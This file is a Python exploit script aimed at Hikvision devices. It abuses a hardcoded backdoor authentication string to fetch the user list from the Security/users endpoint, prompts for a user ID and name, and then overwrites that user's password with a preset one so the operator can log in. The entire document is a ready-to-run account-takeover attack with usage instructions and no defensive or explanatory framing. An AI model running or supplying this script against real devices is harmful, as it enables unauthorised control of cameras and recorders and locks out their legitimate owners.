#!/usr/bin/env python
import requests
import re
import sys

# BASIC INFO
newPass = "@Dm1N1$Tr80R"  # EXAMPLE OF A PASSWORD COMPLIANT WITH LATER FIRMWARES REQUIRING AT LEAST 2 UPPERCASE, 2 lowercase, and 2 SPECIAL CHARACTERS.
BackdoorAuthArg = "auth=YWRtaW46MTEK"  # AUTHENTICATION KEY.

if len(sys.argv) != 4:
    print("[i] Usage: python exploit.py [IP Address] [Port] [SSL (Y/N)]")
    sys.exit()

ip = sys.argv[1]
port = int(sys.argv[2])
SSL = sys.argv[3].strip().upper()

if SSL == "Y":
    protocol = "https"
else:
    protocol = "http"

URLBase = f"{protocol}://{ip}:{port}/"
URLDownload = URLBase + "Security/users?" + BackdoorAuthArg

print("[+] Getting User List.")
DownloadResponse = requests.get(URLDownload).text

userID = ""
userName = ""

for line in DownloadResponse.splitlines():
    useridmatch = re.search(r"<id>(.*)<\/id>", line)
    usernamematch = re.search(r"<userName>(.*)<\/userName>", line)

    if useridmatch:
        userID = useridmatch.group(1)
        print("[+] User ID: " + userID)

    if usernamematch:
        userName = usernamematch.group(1)
        print("[+] Username: " + userName)

userID = input("[?] Which User ID would you like to use? ")
userName = input("[?] Which Username would you like to use? ")

print("[+] Using the User " + userName + ".")

userXML = f'<User version="1.0" xmlns="http://www.hikvision.com/ver10/XMLSchema">\r\n<id>{userID}</id>\r\n<userName>{userName}</userName>\r\n<password>{newPass}</password>\r\n</User>'
URLUpload = URLBase + "Security/users/" + userID + "?" + BackdoorAuthArg

print("[+] Changing Password now.")
response = requests.put(URLUpload, data=userXML)
print(response.text)

print(f"[+] Complete. Please try logging in with these credentials. Username: {userName} Password: {newPass}")
